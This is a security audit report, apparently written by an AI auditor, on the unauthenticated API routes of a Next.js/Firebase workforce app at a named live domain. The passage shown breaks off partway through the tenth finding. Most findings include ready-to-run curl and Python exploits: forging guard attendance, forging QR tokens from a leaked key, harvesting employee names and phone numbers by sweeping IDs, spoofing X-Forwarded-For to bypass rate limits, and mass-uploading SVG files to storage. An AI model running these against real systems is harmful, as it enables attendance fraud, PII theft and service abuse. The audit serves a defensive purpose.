# CISS Workforce — Public / Unauthenticated API Audit

**Task:** `task-2` — Audit public and unauthenticated API routes for IDOR, data exposure and abuse.
**Auditor:** `public-api-auditor` (delegated teammate)
**Date:** 2026-10-06
**Target:** `/Users/mymac/Documents/CISS` — Next.js 15 App Router + Firebase Admin SDK, deployed at `cisskerala.site`.
**Method:** source-level audit only. No request was issued against the live site. Every finding is marked **Confirmed (source)** — proven by code path — or **needs-live-verification** — the code defect is confirmed but the exploit's success depends on a deployment-environment fact (a Vercel env var, Vercel's header handling, or live data).

Placeholders used in requests: `HOST` = `cisskerala.site`, `TOKEN` = a valid Firebase ID token, `EMPLOYEE_DOC_ID` = the Firestore document id of an employee.

---

## 0. Scope coverage

Every route named in the task spec was read in full, including the helpers each one calls.

| Route | Auth check | Verdict |
|---|---|---|
| `src/app/api/health/route.ts` | none | PA-15 (Low) |
| `src/app/api/mobile/token/route.ts` | `verifyRequestAuth` | Clean |
| `src/app/api/mobile/session/route.ts` | `verifyRequestAuth` | Clean |
| `src/app/api/employees/lookup/route.ts` | none (rate limit only) | PA-14 |
| `src/app/api/employees/public-profile/[id]/route.ts` | none | PA-10 |
| `src/app/api/geocode-site/route.ts` | `requireAdmin` | Clean (no SSRF) |
| `src/app/api/locations/geocode/route.ts` | `requireAdmin` | Clean (no SSRF) |
| `src/app/api/public/app-update/route.ts` | none (public by design) | PA-11 |
| `src/app/api/public/attendance/route.ts` | none | PA-06 |
| `src/app/api/public/attendance/employee/route.ts` | **none, no rate limit** | PA-03 |
| `src/app/api/public/attendance/identify/route.ts` | none (rate limit only) | **PA-01, PA-04** |
| `src/app/api/public/attendance/upload-token/route.ts` | token check only | PA-01 chain, PA-16 |
| `src/app/api/public/attendance/upload/route.ts` | upload token only | PA-01 chain, PA-16 |
| `src/app/api/public/attendance/verify-qr/route.ts` | none (auth only gates phone) | PA-07 |
| `src/app/api/public/clients/route.ts` | none | PA-12 |
| `src/app/api/public/download/android/route.ts` | none (public by design) | PA-11 |
| `src/app/api/public/enroll/draft/route.ts` | none (rate limit only) | PA-08 |
| `src/app/api/public/enroll/upload/route.ts` | draft token only, **no rate limit** | PA-09 |
| `src/app/api/public/enrollment-config/route.ts` | none (public by design) | Low — form field catalogue only |
| `src/app/api/public/portal-context/route.ts` | none | Low — client name/portal URL keyed on untrusted `Host` |
| `src/app/api/public/region-config/[code]/route.ts` | none | PA-13 |
| `src/app/api/public/regions/route.ts` | none | PA-13 (related, Low) |

Cross-cutting root cause: **PA-05** (IP trust) defeats the rate limiting on every row above that has any.

---

## PA-01 — Critical — Unauthenticated attendance forgery for any employee ID

**Severity:** Critical
**Status:** Confirmed (source)
**Location:**
- `src/app/api/public/attendance/identify/route.ts:197-207` (matching), `:126-135` (token mint), `:256`
- `src/app/api/attendance/submit/route.ts:321-341` (token consumption)
- `src/lib/server/attendance-verification-token.ts:42-59`

### Evidence

The public `identify` endpoint performs **no proof of identity** for the `employeeId`, `phone`, `resourceId` or tokenless-`qr` methods. It looks the guard up and mints a signed identity proof for whoever was found:

```ts
// src/app/api/public/attendance/identify/route.ts:126-135
return NextResponse.json({
  found: true,
  authenticated: method === "authenticated",
  verificationToken:
    method === "authenticated"
      ? null
      : generateAttendanceVerificationToken({
          employeeDocId: employeeDoc.id,
          method,
        }),
```

```ts
// src/app/api/public/attendance/identify/route.ts:197-207
if (input.method === "employeeId") {
  matches = await findByEmployeeId(input.value);
  if (input.phoneNumber) {            // <-- optional second factor
    ...
  }
}
```

The private key to the whole scheme is the *lookup*, and the lookup key is a guessable employee code (see PA-03). `attendance/submit` then accepts an anonymous POST that is gated only by that minted token:

```ts
// src/app/api/attendance/submit/route.ts:323-340
} else {
  const verification = payload.attendanceVerificationToken
    ? verifyAttendanceVerificationToken(payload.attendanceVerificationToken)
    : null;
  if (
    !verification ||
    verification.employeeDocId !== payload.employeeDocId
  ) {
    return NextResponse.json({ error: "Guard identification has expired or is invalid. ..." }, { status: 401 });
  }
}
```

The token binds `employeeDocId` and expires (600 s), but nothing binds it to a *person*: the server itself hands it to any anonymous caller who names the right employee.

### Exploit

Step 1 — mint an identity token for an arbitrary guard (no credentials):

```bash
curl -sS -X POST "https://HOST/api/public/attendance/identify" \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 203.0.113.7" \
  -d '{"method":"employeeId","value":"CISS/TCS/2025-26/871"}'
```

Expected response (source-derived):

```json
{"found":true,"authenticated":false,
 "verificationToken":"<base64url payload>.<hmac>",
 "employee":{"id":"EMPLOYEE_DOC_ID","employeeCode":"CISS/TCS/2025-26/871",
             "fullName":"…","clientName":"…",
             "attendanceHint":{"lastStatus":"Out","recommendedStatus":"In"}}}
```

Step 2 — obtain the photo upload token (also anonymous):

```bash
curl -sS -X POST "https://HOST/api/public/attendance/upload-token" \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 203.0.113.8" \
  -d '{"employeeDocId":"EMPLOYEE_DOC_ID","siteId":"SITE_ID",
       "attemptId":"3f1c9c1e-6a4e-4c2f-9d3e-2b7c1a5e8f01",
       "attendanceVerificationToken":"<token from step 1>"}'
```

Step 3 — upload a photo to the exact path the submit endpoint will validate:

```bash
curl -sS -X POST "https://HOST/api/public/attendance/upload" \
  -H "Content-Type: application/json" \
  -d '{"path":"employees/EMPLOYEE_DOC_ID/attendance/3f1c9c1e-6a4e-4c2f-9d3e-2b7c1a5e8f01/photo.jpg",
       "photoDataUrl":"data:image/jpeg;base64,<base64>",
       "uploadToken":"<token from step 2>"}'
```

Step 4 — record attendance as that guard (`siteId`, `siteName`, `district`, `shiftCode` all come from the fully public `/api/public/attendance` dump, PA-06; coordinates must sit inside the site geofence, also public):

```bash
curl -sS -X POST "https://HOST/api/attendance/submit" \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 203.0.113.9" \
  -d '{
    "employeeId":"CISS/TCS/2025-26/871",
    "employeeName":"<name from step 1>",
    "employeeDocId":"EMPLOYEE_DOC_ID",
    "status":"In",
    "district":"Ernakulam",
    "siteId":"SITE_ID","siteName":"<siteName from /api/public/attendance>",
    "siteCoords":{"lat":9.5916,"lng":76.5222},
    "locationText":"<siteName>","locationCoords":{"lat":9.5916,"lon":76.5222,"accuracyMeters":12},
    "distanceMeters":8,
    "locationCapturedAt":"2026-10-06T14:29:00.000Z",
    "photoUrl":"https://firebasestorage.googleapis.com/v0/b/ciss-workforce.firebasestorage.app/o/employees%2FEMPLOYEE_DOC_ID%2Fattendance%2F3f1c9c1e-6a4e-4c2f-9d3e-2b7c1a5e8f01%2Fphoto.jpg?alt=media&token=<uuid>",
    "photoStoragePath":"employees/EMPLOYEE_DOC_ID/attendance/3f1c9c1e-6a4e-4c2f-9d3e-2b7c1a5e8f01/photo.jpg",
    "photoCapturedAt":"2026-10-06T14:29:00.000Z",
    "deviceInfo":{"userAgent":"okhttp/4.9"},
    "attendanceAttemptId":"3f1c9c1e-6a4e-4c2f-9d3e-2b7c1a5e8f01",
    "attendanceVerificationToken":"<token from step 1>"
  }'
```

Expected: `{"success":true,"id":"<attendanceLogId>"}`.

### Impact

An unauthenticated attacker (a) forges clock-in/clock-out for any guard, (b) writes `attendanceLogs`, `attendanceState`, `attendanceSessions` and — critically — `guardLocations` live GPS documents (`submit/route.ts:972-1009`), i.e. plants a false live position for a real guard, and (c) can auto-close another guard's open session (`submit/route.ts:676-752`). Payroll, client billing and the "guard is on site" operational picture are all attacker-controlled. Note `GEOFENCE_ENFORCEMENT_MODE` defaults to `warn` (`submit/route.ts:602`), so even out-of-zone submissions from outside the district are accepted when the district matches.

### Fix

- Require a real authentication factor for `identify` when the method is not `authenticated`: a guard PIN/OTP (there is already `guard/auth/send-reset-otp` + `verify-reset-otp`), or a signed QR token whose secret is server-only and whose payload binds `employeeDocId` **and** the phone number on record (see PA-02).
- Never let `employeeId` alone mint an identity token: make `phoneNumber` mandatory for `method:"employeeId"` and compare it against the stored value server-side with a constant-time compare.
- Bind `verifyAttendanceVerificationToken` payloads to a server-stored, single-use nonce (PA-16) and to the guard's `guardAuthUid` when one exists.
- Set `GEOFENCE_ENFORCEMENT_MODE=strict` in production and require `overrideReason` review.

---

## PA-02 — High (Critical if the env var is unset in production) — QR HMAC secret falls back to a public value and a hardcoded default

**Severity:** High — escalates to Critical on the live deployment
**Status:** Code defect **Confirmed (source)**; exploitability **needs-live-verification** (whether `CISS_QR_SECRET` is set on Vercel)
**Location:** `src/lib/qr/qr-token.ts:6-9`

### Evidence

```ts
// src/lib/qr/qr-token.ts:6-9
const QR_SECRET =
  process.env.CISS_QR_SECRET ||
  process.env.NEXT_PUBLIC_FIREBASE_API_KEY ||
  "ciss-default-qr-secret";
```

`CISS_QR_SECRET` appears **nowhere except this line** — verified by an exhaustive grep of the repository and of every env file present:

```
$ grep -rn "CISS_QR_SECRET" --include="*" . | grep -v node_modules | grep -v '^./.next'
./src/lib/qr/qr-token.ts:7
```

`CISS_QR_SECRET` is absent from `.env.local`, `.env.example`, `.env.vercel` and `.env.vercel.local` (all four were enumerated key-by-key). Therefore at runtime the secret resolves to `NEXT_PUBLIC_FIREBASE_API_KEY` — a value that is **public by construction** (it ships in the browser bundle via `NEXT_PUBLIC_*` inlining) and is additionally served to anonymous callers in JSON by `/api/public/region-config/KL` (`region-config/[code]/route.ts:20`). If `CISS_QR_SECRET` is unset in production too, the QR HMAC key is fully known to the attacker, and if neither is set the hardcoded literal `"ciss-default-qr-secret"` is used.

The token is a 16-char truncation of `HMAC-SHA256(secret, "<employeeId>:<phoneNumber>")` (`qr-token.ts:31-44`), so knowing the secret plus the two public inputs (employee ID — enumerable, PA-03/PA-04; phone — leaked by PA-03) yields a valid token.

### Exploit

```bash
# 1. Steal the public Firebase API key, which is also the HMAC key
KEY=$(curl -sS "https://HOST/api/public/region-config/KL" | python3 -c 'import json,sys;print(json.load(sys.stdin)["web"]["apiKey"])')

# 2. Forge a QR token for a guard we only know by employee ID
python3 - "$KEY" <<'PY'
import base64, hashlib, hmac, sys
key, emp, phone = sys.argv[1].encode(), "CISS/TCS/2025-26/871", "9876543210"
sig = hmac.new(key, f"{emp}:{phone}".encode(), hashlib.sha256).digest()
print(base64.urlsafe_b64encode(sig).decode().rstrip("=")[:16])
PY

# 3. Present the forged QR to the public verifier — expect verified:true
curl -sS -X POST "https://HOST/api/public/attendance/verify-qr" \
  -H "Content-Type: application/json" \
  -d '{"qrText":"CISS-ATTENDANCE\nEmployee ID: CISS/TCS/2025-26/871\nName: X\nPhone: 9876543210\nToken: <forged token>"}'
```

Expected if the fallback key is in force: `{"verified":true,...}`. Feed the same forged string to `/api/public/attendance/identify` with `{"method":"qr","value":"..."}` and the HMAC check at `identify/route.ts:221-230` passes.

### Impact

The entire "QR proves the guard is physically present / the QR is authentic" control collapses: QR codes can be manufactured for any guard from public data, then used through PA-01 to record attendance and plant GPS. It also means QR tokens for *one* guard can be generated without ever seeing that guard's badge — the phone number is the only extra input and PA-03 leaks it.

### Fix

- Make the secret server-only and mandatory: throw at module load if `CISS_QR_SECRET` is missing in every environment, never fall back to a `NEXT_PUBLIC_*` value and never to a literal.
- Set `CISS_QR_SECRET` in Vercel (Production + Preview + Development) to a 32-byte random value, and rotate it (which invalidates old badges — coordinate a reprint run).
- Increase the token to the full HMAC (32 bytes base64url), and add an expiry/version prefix so tokens can be revoked.
- Confirm the live fix by re-running the step-3 check above and requiring `verified:false`.

---

## PA-03 — High — Unauthenticated PII disclosure and employee enumeration, with no rate limiting at all

**Severity:** High
**Status:** Confirmed (source)
**Location:**
- `src/app/api/public/attendance/employee/route.ts:7-11`, `:55-86`, `:110-143`
- `src/lib/attendance/public-attendance.ts:116-144` (specifically `:134-137`)

### Evidence

The handler imports **no rate-limit helper** (imports are only `NextRequest`, `NextResponse`, `db`, `buildPublicAttendanceEmployee`), and it accepts a caller-supplied employee ID or phone number directly from the query string:

```ts
// src/app/api/public/attendance/employee/route.ts:9-11
let employeeId = request.nextUrl.searchParams.get("employeeId")?.trim() || "";
const phoneNumber =
  request.nextUrl.searchParams.get("phoneNumber")?.replace(/\D/g, "").slice(-10) || "";
const resourceId = request.nextUrl.searchParams.get("resourceId")?.trim() || "";
```

```ts
// src/app/api/public/attendance/employee/route.ts:110-143
const employee = buildPublicAttendanceEmployee(
  doc.id,
  doc.data() as Record<string, unknown>,
  attendanceState ? { lastAttendanceDate: …, lastStatus: …,
  lastSiteId: …, lastDutyPointId: …, lastShiftCode: …, openSessionId: … } : undefined,
);
return NextResponse.json({ found: true, employee });
```

and the builder includes the guard's phone number and the internal document id:

```ts
// src/lib/attendance/public-attendance.ts:121-142
return {
  id,                                   // <-- Firestore doc id, needed by /api/attendance/submit
  employeeCode: … data.employeeId …,
  fullName: …,
  phoneNumber:
    typeof data.phoneNumber === "string" && data.phoneNumber
      ? data.phoneNumber
      : undefined,
  clientName: …,
  attendanceHint,
};
```

Employee IDs are highly enumerable: `generateEmployeeId` builds `CISS/{CLIENT}/{FY}/{NNN}` with `randomInt(1, 1000)` (`src/lib/employee-id.ts:33-41`), i.e. **999 possible IDs per client per financial year** — a full-dictionary sweep is ~1,000 requests per client.

### Exploit

```bash
# PII + internal doc id + live attendance state, no credential, no rate limit
curl -sS "https://HOST/api/public/attendance/employee?employeeId=CISS/TCS/2025-26/871"

# reverse direction: phone number -> guard identity
curl -sS "https://HOST/api/public/attendance/employee?phoneNumber=9876543210"

# sweep the whole ID space (999 requests covers a client/FY)
for n in $(seq 1 999); do
  curl -sS "https://HOST/api/public/attendance/employee?employeeId=CISS/TCS/2025-26/$(printf %03d $n)" \
    >> guards.json
done
```

Expected:

```json
{"found":true,"employee":{"id":"EMPLOYEE_DOC_ID","employeeCode":"CISS/TCS/2025-26/871",
 "fullName":"…","phoneNumber":"9876543210","clientName":"…",
 "attendanceHint":{"lastStatus":"In","lastSiteId":"SITE_ID","lastShiftCode":"A",
                   "openSessionId":"…","lastAttendanceDate":"2026-10-06"}}}
```

### Impact

Anonymous bulk extraction of the guard roster: full name, employee code, **mobile number**, deploying client, and real-time duty status/site/shift/open session. The `id` returned is exactly the `employeeDocId` required by PA-01/`attendance/submit`, so this is the reconnaissance half of the attendance-forgery chain. The `phoneNumber=…` direction is also a free identity oracle for any 10-digit number.

### Fix

- Delete the endpoint or require authentication; the public attendance page already has `identify` for its legitimate use.
- If it must stay public, remove `phoneNumber` and `id` from the payload, return only a boolean/opaque handle, and apply the same rate limiting as `identify` with an IP source that cannot be spoofed (PA-05).
- Do not key anything on the guessable `CISS/…/NNN` code for unauthenticated flows — the sequence space is 999.

---

## PA-04 — High — QR integrity check is skipped entirely when the QR carries no `Token:` field

**Severity:** High
**Status:** Confirmed (source)
**Location:** `src/app/api/public/attendance/identify/route.ts:213-242` (bypass at `:221-230`)
**Related:** `src/lib/qr/qr-token.ts:78-107` (`parseQrContent` returns `token: null` for any text without a `Token:` line)

### Evidence

```ts
// src/app/api/public/attendance/identify/route.ts:214-231
const qr = parseQrContent(input.value);
if (!qr.employeeId) {
  return NextResponse.json({ error: "This QR code does not contain a valid employee ID." }, { status: 400 });
}
if (
  qr.token &&                                   // <-- no token => no verification at all
  (!qr.phoneNumber ||
    !(await verifyQrToken(qr.employeeId, qr.phoneNumber, qr.token)))
) {
  return NextResponse.json({ error: "This QR code is invalid or has been altered." }, { status: 401 });
}
matches = await findByEmployeeId(qr.employeeId);
```

`parseQrContent` matches `Employee\s*ID\s*:\s*([^\n\r]+)` and falls back to a first line beginning `CISS/`, so a hand-written string with only an employee ID is parsed successfully and yields `token: null`.

### Exploit

```bash
# No token at all — verification branch is skipped, identity is accepted
curl -sS -X POST "https://HOST/api/public/attendance/identify" \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 198.51.100.23" \
  -d '{"method":"qr","value":"Employee ID: CISS/TCS/2025-26/871"}'
```

Expected: `{"found":true,"verificationToken":"…","employee":{…}}` — identical to presenting a genuine badge, even though no signature was ever checked.

### Impact

Defeats the design intent recorded in `verify-qr/route.ts:90` ("undocumented QRs are NOT reported as verified") for the *attendance* path: an attacker never needs a badge image, only a guessed employee ID, so PA-02/PA-03 need not even be used. This is the cheapest entry into the PA-01 forgery chain.

### Fix

- Reject any QR presented to a public path unless `qr.token` and `qr.phoneNumber` are both present and `verifyQrToken` returns true; a missing token must be a 401, not a bypass.
- After PA-02, additionally require the token to be unexpired and bound to the employee record's current phone number.

---

## PA-05 — High — Client IP is taken from the spoofable left-most `X-Forwarded-For`, defeating every rate limit

**Severity:** High
**Status:** Code defect Confirmed (source); live impact needs-live-verification (Vercel header normalisation)
**Location:** `src/lib/server/rate-limit.ts:104-124`

### Evidence

```ts
// src/lib/server/rate-limit.ts:105-117
 * Sanitizes x-forwarded-for per Vercel guidance: only the leftmost IP is the client.
export function getClientIp(request: Request): string {
  const forwarded = request.headers.get("x-forwarded-for");
  if (forwarded) {
    // Vercel/cloud proxies append to the right; the leftmost is the original client
    const raw = forwarded.split(",")[0]?.trim() ?? "";
    const withoutPort = raw.replace(/:\d+$/, "");
    const clean = withoutPort.replace(/^\[|\]$/g, "");
    return clean || "unknown";
  }
  const realIp = request.headers.get("x-real-ip");
  ...
  return "unknown";
}
```

The helper trusts the left-most, i.e. client-supplied, entry of `X-Forwarded-For`, and only consults `x-real-ip` when `X-Forwarded-For` is absent — so any caller can choose their own rate-limit bucket. The middleware (`src/middleware.ts:46-56`) excludes `/api` from its matcher and does not strip or normalise headers.

Two consequences:
1. Every `checkRateLimit` call keyed on `getClientIp` is bypassable: `attendance/identify` (15/min, `identify/route.ts:181-191`), `public/attendance` (30/min), `verify-qr` (60/min), `upload-token` (10/min), `attendance/upload` (10/min), `enroll/draft` (10/h, and its key is `ip:phone`), `employees/lookup` (5/min) and `attendance/submit` for anonymous callers (5/min).
2. `checkRateLimit` writes one Firestore document per distinct key (`rate-limit.ts:26`, `:42`/`:54`) into the unbounded `rateLimits` collection. With a fresh spoofed IP per request, an attacker generates one Firestore write per request — a direct cost/quota amplification vector, with **no TTL, sweep or cleanup anywhere in the repo**.

Also note the `"unknown"` fallback: when headers are missing entirely, every caller shares one bucket, which is a self-inflicted global lockout rather than a defence.

### Exploit

```bash
# 60 identify calls with 60 different leftmost XFF values — none hits the 15/min limit
for i in $(seq 1 60); do
  curl -sS -o /dev/null -w "%{http_code} " \
    -X POST "https://HOST/api/public/attendance/identify" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.$((i/250)).$((i%250))" \
    -d '{"method":"employeeId","value":"CISS/TCS/2025-26/'"$(printf %03d $i)"'"}'
done; echo
```

Expected: sixty `200`/`404` responses and zero `429`, versus `429` after 15 requests with a fixed IP.

### Impact

Turns bounded abuse (enumeration PA-03/PA-14, invite/SMS-cost endpoints, attendance forgery, enrollment-document storage PA-08/PA-09) into unbounded abuse, and adds a per-request Firestore-write cost channel.

### Fix

- Derive the client identity from a value the edge sets and the client cannot forge. On Vercel use the platform-set headers (e.g. `x-real-ip` / `x-vercel-forwarded-for`, or the right-most `X-Forwarded-For` entry cleared of trusted proxies) instead of `split(",")[0]`. Prefer Vercel's own WAF/rate-limit product for the public surface.
- Reject requests whose left-most XFF value is a private/loopback address, and fail closed when no trustworthy client identity is available.
- Add a TTL/cleanup for `rateLimits` (a Firestore TTL policy on `updatedAt`, or the existing cron worker) so the collection cannot grow without bound.

---

## PA-06 — High — Anonymous dump of every site, client, GPS coordinate, duty point and shift pattern

**Severity:** High (business-confidential data, no auth)
**Status:** Confirmed (source)
**Location:** `src/app/api/public/attendance/route.ts:31-52`; builder `src/lib/attendance/public-attendance.ts:80-114`

### Evidence

```ts
// src/app/api/public/attendance/route.ts:31-43
const [sitesSnapshot, clientLocSnapshot] = await Promise.all([
  db.collection('sites').get(),
  db.collection('clientLocations').get(),
]);
const options = [
  ...sitesSnapshot.docs.map((doc) =>
    buildPublicAttendanceSiteOption(doc.id, doc.data() as Record<string, unknown>, 'sites'),
  ),
  ...clientLocSnapshot.docs.map((doc) =>
    buildPublicAttendanceSiteOption(doc.id, doc.data() as Record<string, unknown>, 'clientLocations'),
  ),
];
```

with no filter on status/client and the builder exporting coordinates:

```ts
// src/lib/attendance/public-attendance.ts:87-113
return {
  id, siteName: …, clientName: …, clientId: …, district: …,
  geofenceRadiusMeters: …, strictGeofence: …, shiftMode: …,
  shiftPattern: …, shiftTemplates: …,
  dutyPoints: sourceCollection === "sites" ? resolveSiteDutyPoints(…) : [],
  sourceCollection,
  ...(coords ?? {}),        // { lat, lng }
};
```

### Exploit

```bash
curl -sS "https://HOST/api/public/attendance" | python3 -m json.tool | head -60
```

Expected: `{"options":[{"id":"…","siteName":"…","clientName":"…","clientId":"…","district":"…","lat":9.59,"lng":76.52,"geofenceRadiusMeters":150,"shiftMode":"fixed","shiftPattern":"…","dutyPoints":[…],"sourceCollection":"sites"}, …]}`

### Impact

The complete deployment map: every guarded site with its exact coordinates and geofence radius, the client that owns it, its district, its duty points and shift schedule. Commercially sensitive (client roster + site locations) and operationally sensitive (it is simultaneously the targeting list and the input set needed to satisfy the geofence check in PA-01 step 4). The 30/min limit is nominal given PA-05; responses are also CDN-cached for 300 s.

### Fix

- Serve only the site(s) relevant to an identified guard after `identify` succeeds, rather than the whole collection.
- Drop `clientId`, `clientName` and exact `lat`/`lng` from the public shape; return an opaque site handle and let the server resolve coordinates during submission.
- If a public site picker is genuinely needed, paginate + rate limit it and exclude non-operational sites.

---

## PA-07 — Medium — `verify-qr` discloses guard identity and live attendance state to anonymous callers; phone deferred to auth but the rest is not

**Severity:** Medium
**Status:** Confirmed (source)
**Location:** `src/app/api/public/attendance/verify-qr/route.ts:105-157`

### Evidence

The handler deliberately gates only two fields behind authentication:

```ts
// src/app/api/public/attendance/verify-qr/route.ts:136-140
// Only include PII fields (phoneNumber, status) for authenticated callers
if (callerIsAuthenticated) {
  employee.phoneNumber = employeeData.phoneNumber ?? "";
  employee.status = employeeData.status ?? "";
}
```

but the unauthenticated branch still returns identity, employer and live duty state:

```ts
// src/app/api/public/attendance/verify-qr/route.ts:120-134
const employee: Record<string, unknown> = {
  id: employeeDoc.id,
  employeeId: employeeData.employeeId ?? "",
  fullName: employeeData.fullName || employeeData.name || [employeeData.firstName ?? "", employeeData.lastName ?? ""].join(" ").trim(),
  clientName: employeeData.clientName ?? "",
  district: employeeData.district ?? "",
};
```

```ts
// src/app/api/public/attendance/verify-qr/route.ts:145-156
attendanceHint: stateData ? {
  lastAttendanceDate: …, lastStatus: …, lastSiteId: …, lastDutyPointId: …,
  lastShiftCode: …, openSessionId: …, recommendedStatus: … } : null,
```

Additionally the phone filter is a substring test (`:70-78`, `phone.includes(parsed.phoneNumber!)`) rather than an equality test, so a short `Phone:` value can widen rather than narrow the candidate set.

### Exploit

```bash
curl -sS -X POST "https://HOST/api/public/attendance/verify-qr" \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 192.0.2.44" \
  -d '{"qrText":"Employee ID: CISS/TCS/2025-26/871"}'
```

Expected: `{"verified":false,"employee":{"id":"EMPLOYEE_DOC_ID","employeeId":"CISS/TCS/2025-26/871","fullName":"…","clientName":"…","district":"…"},"attendanceHint":{"lastStatus":"In","lastSiteId":"…","openSessionId":"…"}}` — note `verified:false` yet full identity and duty state returned.

### Impact

Same information class as PA-03 (identity + live deployment state, no credential), reachable at 60 requests/min per spoofed IP. Confirms to an attacker which guards are currently on duty and where.

### Fix

- Require authentication (or a validated QR token) before returning any employee object; a `verified:false` response should be `{verified:false}` only.
- Replace the `includes` phone comparison with a constant-time equality on the normalised 10-digit value.
- Trim the anonymous response to a boolean, and keep `attendanceHint` server-side only.

---

## PA-08 — Medium — Anonymous, unbounded creation of enrollment drafts for arbitrary phone numbers

**Severity:** Medium (data-integrity / cost abuse)
**Status:** Confirmed (source)
**Location:** `src/app/api/public/enroll/draft/route.ts:16-57`

### Evidence

```ts
// src/app/api/public/enroll/draft/route.ts:18-30
const body = (await request.json()) as { phoneNumber?: unknown };
const phoneNumber = String(body.phoneNumber ?? "").replace(/\D/g, "");
if (!/^\d{10}$/.test(phoneNumber)) { … 400 … }
const ip = getClientIp(request);
const rateLimit = await checkRateLimit(
  buildRateLimitKey("enrollment-draft", `${ip}:${phoneNumber}`),
  { maxRequests: 10, windowMs: 60 * 60 * 1000, failClosed: true },
);
```

```ts
// src/app/api/public/enroll/draft/route.ts:40-51
const draftRef = db.collection("enrollments").doc();
const token = createEnrollmentDraftToken();
await draftRef.create({ status: "draft", phoneNumber, tokenHash: …, uploadCount: 0, … });
```

The key is `ip:phoneNumber`, so varying either dimension multiplies the quota; `ip` is spoofable (PA-05). There is no CAPTCHA even though `NEXT_PUBLIC_RECAPTCHA_V3_SITE_KEY` is configured in `.env.local`, and no verification that the phone number belongs to the caller (no OTP is sent here).

### Exploit

```bash
for i in $(seq -w 1 60); do
  curl -sS -o /dev/null -w "%{http_code} " \
    -X POST "https://HOST/api/public/enroll/draft" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 172.16.$((i/250)).$((i%250))" \
    -d "{\"phoneNumber\":\"90000${i}0\"}"
done; echo
```

Expected: a `draftId`/`uploadToken` for each of the 60 calls (the intended cap is 10/hour per ip+phone), each creating a Firestore `enrollments` document for a phone number the attacker does not control.

### Impact

Unbounded Firestore document creation attributed to arbitrary (likely real) phone numbers — pollutes the enrollment queue, inflates billing, and creates plausible "started enrolling" records for third parties. The 2-hour TTL + `internal/enrollment-draft-cleanup` cron (`enrollment-draft.ts:3`, `vercel.json` crons) bounds each document's life but not the creation rate.

### Fix

- Require a reCAPTCHA/App-Check token, or require an OTP round-trip before creating a draft.
- Key the limit on a trustworthy client identity (PA-05) *and* cap per-phone globally, not per `ip:phone` pair.
- Cap outstanding drafts per phone number and per IP, and alert on rate spikes.

---

## PA-09 — Medium — Enrollment upload has no rate limiting and accepts client-declared MIME types on the main Storage bucket

**Severity:** Medium
**Status:** Confirmed (source)
**Location:** `src/app/api/public/enroll/upload/route.ts:38-123`
**Related constants:** `src/lib/server/enrollment-draft.ts:4` (`ENROLLMENT_DRAFT_MAX_UPLOADS = 20`), `src/lib/enrollmentFiles.ts:3-41`

### Evidence

The handler imports no rate-limit helper and performs no throttle of its own:

```ts
// src/app/api/public/enroll/upload/route.ts:40-43
const formData = await request.formData();
const file = formData.get("file");
const path = String(formData.get("path") || "");
const uploadToken = String(formData.get("uploadToken") || "");
```

Storage metadata takes the caller's MIME string verbatim, and any `image/*` passes the validator:

```ts
// src/app/api/public/enroll/upload/route.ts:105-114
await storageFile.save(buffer, {
  resumable: false,
  metadata: {
    contentType: file.type || "application/octet-stream",
    cacheControl: isRestrictedDocument ? "no-store, private, max-age=0" : undefined,
    metadata: downloadToken ? { firebaseStorageDownloadTokens: downloadToken } : {},
  },
});
```

```ts
// src/lib/enrollmentFiles.ts:11-29
export function getEnrollmentFileSelectionError(file: File): string | null {
  if (file.type.startsWith("image/")) { … size check … return null; }
  if (file.type === "application/pdf") { … }
  return "Invalid file type. Use any image format or PDF.";
}
```

`file.type` is attacker-controlled, so `image/svg+xml` (and any `image/*` alias) is accepted and stored with that `contentType`. Only `aadharCards` is excluded from receiving a bearer `firebaseStorageDownloadTokens` value (`:100-103`); every other folder, `profilePictures` included, gets a permanent public download token.

### Exploit

```bash
# draft (see PA-08), then loop the 20-file quota per draft
TOKEN=$(curl -sS -X POST "https://HOST/api/public/enroll/draft" \
  -H "Content-Type: application/json" -d '{"phoneNumber":"9876543210"}')
DRAFT=$(echo "$TOKEN" | python3 -c 'import json,sys;print(json.load(sys.stdin)["draftId"])')
UT=$(echo "$TOKEN" | python3 -c 'import json,sys;print(json.load(sys.stdin)["uploadToken"])')

for i in $(seq 1 20); do
  curl -sS -X POST "https://HOST/api/public/enroll/upload" \
    -F "path=enrollments/$DRAFT/profilePictures/poc$i.svg" \
    -F "uploadToken=$UT" \
    -F "file=@poc.svg;type=image/svg+xml"      # 4 MB max per file
done
```

Expected: 20 × `{"url":"https://firebasestorage.googleapis.com/v0/b/…?alt=media&token=…"}` — no `429` at any point, ~80 MB of attacker-chosen content in the production bucket per draft, with public download tokens.

### Impact

Anonymous Storage write/bandwidth abuse and hosting of attacker content (including SVG/HTML-with-image-MIME) on the project's bucket, distributed under `firebasestorage.googleapis.com` — usable for phishing payload hosting and reputation/cost damage. Verified-pattern path binding (`:49-53`) and the timing-safe draft-token check (`enrollment-draft.ts:14-22`) correctly prevent path traversal and IDOR here, so this is purely a resource-abuse and content-type finding.

### Fix

- Add per-IP (unspoofable) and per-draft rate limiting; lower the per-draft file budget.
- Whitelist the stored `contentType` from an allow-list (`image/jpeg`, `image/png`, `image/webp`, `application/pdf`) instead of echoing `file.type`; sniff magic bytes for the true type.
- Keep the current `aadharCards` no-download-token behaviour, and consider removing download tokens from every enrollment object (they are consumed server-side and moved afterwards).

---

## PA-10 — Medium — `public-profile/[id]` returns any employee's record; the fallback branch ignores `publicProfile` and `status`

**Severity:** Medium
**Status:** Confirmed (source); `qrCodeUrl` content needs-live-verification
**Location:** `src/app/api/employees/public-profile/[id]/route.ts:50-84`

### Evidence

```ts
// src/app/api/employees/public-profile/[id]/route.ts:52-73
const docSnap = await adminDb.collection("employees").doc(id).get();
if (!docSnap.exists) { … 404 … }
const data = docSnap.data()!;
const publicProfile = data.publicProfile as Record<string, unknown> | undefined;
if (publicProfile && publicProfile.status === "Active") {
  return NextResponse.json({
    id: docSnap.id,
    fullName: publicProfile.fullName ?? data.fullName ?? "",
    employeeId: publicProfile.employeeId ?? data.employeeId ?? "",
    clientName: publicProfile.clientName ?? data.clientName ?? "",
    profilePictureUrl: publicProfile.profilePictureUrl ?? data.profilePictureUrl ?? "",
    status: publicProfile.status ?? data.status ?? "",
